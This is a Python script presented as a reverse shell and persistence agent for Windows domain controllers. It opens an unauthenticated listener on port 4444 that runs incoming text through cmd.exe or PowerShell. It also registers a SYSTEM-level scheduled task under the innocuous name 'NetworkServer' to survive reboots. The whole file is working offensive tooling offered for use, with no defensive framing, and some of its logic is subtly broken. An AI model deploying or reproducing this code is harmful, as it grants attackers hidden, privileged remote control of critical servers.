#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows Domain Controller Persistence & Reverse Shell Agent.
All-in-One Python Script:
 1. Establishes a reverse TCP listener (Port 4444 default).
 2. Pipes input to cmd.exe or PowerShell.
 3. Pumps output back to the client.
 4. Installs Windows Task Scheduler persistence (ONSTART) to survive reboot.

"""

import socket
import subprocess
import threading
import sys
import os
import argparse
import time
import datetime
from subprocess import Popen, PIPE

# ==============================================================================
# CONFIGURATION VARIABLES
# ==============================================================================

# Listeners IP (0.0.0.0 means All Interfaces)
LISTENER_HOST = "0.0.0.0"

# Default Listening Port
DEFAULT_PORT = 4444

# Task Scheduler Name (Used for Persistence)
TASK_NAME = "NetworkServer"

# Task Scheduler Run As (Who executes the script)
# SYSTEM = Highest privileges (Ideal for Domain Controllers)
TASK_RUN_AS = "SYSTEM"

# Task Scheduler Trigger
# ONSTART = Runs when any user logs in / Boot
# ONBOOT = Runs strictly at OS Boot (System level)
TASK_TRIGGER = "ONSTART"

# Script Path for Task (Will be resolved to absolute path at runtime)
SCRIPT_PATH = "" # Filled dynamically in the main function

# ==============================================================================
# CLASSES
# ==============================================================================

class SocketHandler:
    """
    Handles the network listener logic.
    Runs in a separate thread to keep the main thread available for 
    persistence installation if needed (though main thread starts listener).
    """
    def __init__(self, host, port, command_type):
        self.host = host
        self.port = port
        self.command_type = command_type
        self.socket = None
        self.thread = None
        
    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"[+] Listener Started on {self.host}:{self.port}")
        print(f"[+] Mode: {self.command_type}")
        print(f"[+] Waiting for connection...")
        
        # Main Loop for the Listener
        while True:
            try:
                client_sock, addr = self.socket.accept()
                # Start a new thread for every client connection
                threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
                time.sleep(1)
                continue

    def process_connection(self, client_sock, addr):
        print(f"[*] Connected to: {addr}")
        
        try:
            while True:
                # Receive data (max 4096 bytes at a time)
                msg = client_sock.recv(4096).decode('utf-8').strip()
                
                if not msg:
                    break
                
                # Prepare the shell command
                # We strip outer quotes if user sends them
                clean_cmd = msg.strip('"\'')
                
                # Execute Command
                output = self.execute_shell(clean_cmd)
                
                # Send back to client
                client_sock.sendall(output.encode('utf-8'))
                
        except Exception as e:
            print(f"[!] Error reading from {addr}: {e}")
        finally:
            try:
                client_sock.close()
            except:
                pass

    def execute_shell(self, cmd):
        """
        Execute command using subprocess.
        Returns stdout, stderr, and return code.
        """
        if not cmd:
            return "Prompt is ready."

        # Determine executable and command
        # cmd.exe is more stable for pure batch
        # powershell.exe is more powerful for one-liners
        executable = "cmd.exe"
        
        if self.command_type == "powershell":
            executable = "powershell.exe"
        
        # Build the shell call
        # Using 'C:\Users\Public\Scripts' as fallback root if not in path
        shell_cmd = executable + " /c " + cmd
        
        # Execute
        try:
            proc = Popen(shell_cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)
            
            # Read outputs in a loop or just stdout/err
            output = ""
            try:
                # Read stdout
                if proc.stdout:
                    output = proc.stdout.read()
                else:
                    output = ""
                
                # Append stderr if available
                if proc.stderr:
                    err = proc.stderr.read()
                    if err:
                        output = output + "\n[Error]: " + err
            except:
                pass
                
            # Capture return code and close
            exit_code = proc.returncode
            proc.wait()

            return f"exit_code:{exit_code}\n{output}"
        except Exception as e:
            return f"Exception: {e}"

# ==============================================================================
# PERSISTENCE MANAGER
# ==============================================================================

class PersistenceManager:
    """
    Handles Windows Task Scheduler registration.
    Creates a 'SYSTEM' task that runs the script on every login (or boot).
    """
    
    @staticmethod
    def create_task(script_path, task_name, run_as="SYSTEM", trigger="ONSTART"):
        """
        1. Ensures Task Scheduler command is available.
        2. Creates/Updates a task.
        3. Runs as SYSTEM.
        """
        print(f"[*] Configuring Persistence via Task Scheduler...")
        
        schtasks_exe = "schtasks"
        # If schtasks is not in PATH, try common windows locations
        if not os.path.exists(schtasks_exe):
            print("[!] Warning: schtasks.exe not found in default path")
            return

        # Escape the script path for CMD shell (replace backslashes with \\ if needed)
        escaped_path = script_path.replace('\\', '\\\\')
        
        command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {escaped_path}" /RU "{run_as}" /SC {trigger} /ST 00:00 /F'
        
        try:
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Task Created/Updated: {task_name}")
                print(f"[+] Running As: {run_as}")
                print(f"[+] Trigger: {trigger}")
            else:
                print(f"[!] Error creating task. Output: {result.stderr}")
        except Exception as e:
            print(f"[!] Exception while creating task: {e}")

# ==============================================================================
# MAIN ENTRY POINT
# ==============================================================================

def get_script_path():
    """
    Determines the absolute path of the running script.
    This is critical for the persistence task to find itself.
    """
    return os.path.abspath(sys.argv[0])

def main():
    # 1. Argument Parsing
    parser = argparse.ArgumentParser(description="DC Reverse Shell Persistence Agent")
    parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Shell mode (Default: cmd)')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listening port (Default: 4444)')
    parser.add_argument('--install', action='store_true', help='Force install persistence (Default: True)')
    
    args = parser.parse_args()
    
    print("="*30)
    print("DC PERSISTENCE & REVERSE SHELL AGENT v2.0")
    print("="*30)
    
    script_path = get_script_path()
    print(f"[*] Script Executing From: {script_path}")
    
    # 2. Setup Socket Listener
    listener = SocketHandler(LISTENER_HOST, args.port, args.mode)
    
    # 3. Setup Persistence (Create Task)
    # We run this AFTER socket setup is done, but usually BEFORE or concurrent.
    # If we run it, the listener thread needs to stay alive.
    if args.install:
        create_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        PersistenceManager.create_task(script_path, TASK_NAME, TASK_RUN_AS, TASK_TRIGGER)
        
        # Wait 2 seconds to allow task creation to settle
        time.sleep(2)

    # 4. Start Listener Thread (Keep Alive)
    listener_thread = threading.Thread(target=listener.start)
    listener_thread.daemon = True # Daemon so script doesn't crash if listener finishes
    listener_thread.start()
    
    # 5. Keep Main Thread Alive
    print("[+] Agent Initialized.")
    print("[+] Main thread will keep running to monitor exit codes.")
    try:
        # Simple loop to keep main alive unless interrupted
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Graceful Shutdown...")
        listener.socket.close()
    except Exception as e:
        print(f"[!] Fatal Error: {e}")

    # Clean up file permissions (optional, remove task if stopped, etc)
    try:
        pass
    except:
        pass

if __name__ == "__main__":
    main()
